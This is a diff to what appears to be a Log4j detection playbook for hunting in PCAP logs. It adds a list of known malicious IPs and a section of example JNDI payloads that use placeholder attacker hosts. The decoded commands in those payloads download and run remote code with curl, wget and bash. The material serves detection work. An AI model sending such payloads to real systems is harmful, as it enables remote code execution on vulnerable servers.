@@ -29,17 +29,28 @@ Search for JNDI lookup patterns using quoted strings:
 - Unusual or empty User-Agent strings
 
 ### 4. Known Malicious Infrastructure (Playbook §4.3)
-- DNS queries to known scanning or suspicious domains
+- DNS queries to known scanning or suspicious domains (e.g., canarytokens.com)
 - Outbound connections to known attacker callback IPs
 - Specific known malicious IPs identified from PCAP analysis:
-  - "49.7.224.217"
-  - "104.248.144.120"
-  - "46.105.95.220"
-  - "5.157.38.50"
-  - "2.57.121.36"
-  - "191.71.247.91"
-  - "175.6.210.66"
-  - "195.54.160.149"
+   - "49.7.224.217"
+   - "104.248.144.120"
+   - "46.105.95.220"
+   - "5.157.38.50"
+   - "2.57.121.36"
+   - "198.71.247.91"
+   - "175.6.210.66"
+   - "195.54.160.149"
+   - "191.232.38.25"
+   - "107.189.1.178"
+   - "147.182.202.30"
+
+### 5. Real-World JNDI Payload Examples (for reference)
+Below are patterns observed in actual Log4j attacks to help recognize indicators:
+- Base64-encoded command payload: `${jndi:ldap://ATTACKER_IP:12344/Basic/Command/Base64/<base64>}` — the base64 decodes to `(curl -s CALLBACK_IP:PORT/TARGET_IP:PORT||wget -q -O- CALLBACK_IP:PORT/TARGET_IP:PORT)|bash`
+- Direct exploit: `${jndi:ldap://ATTACKER_IP:1389/Exploit}`
+- Wget downloader: Base64 payload decoding to `/wget http://ATTACKER_IP/run; curl -O http://ATTACKER_IP/run; chmod 777 run; ./run`
+- Canarytoken callbacks: `${jndi:ldap://SUBDOMAIN.canarytokens.com}`
+- Multiple callback endpoints often used per campaign (e.g., same attacker uses port 12344 for staging + port 1389 for LDAP)
 
 IMPORTANT: Run MULTIPLE queries covering different detection categories. Use index=* (source="*pcap*") for all queries.
 
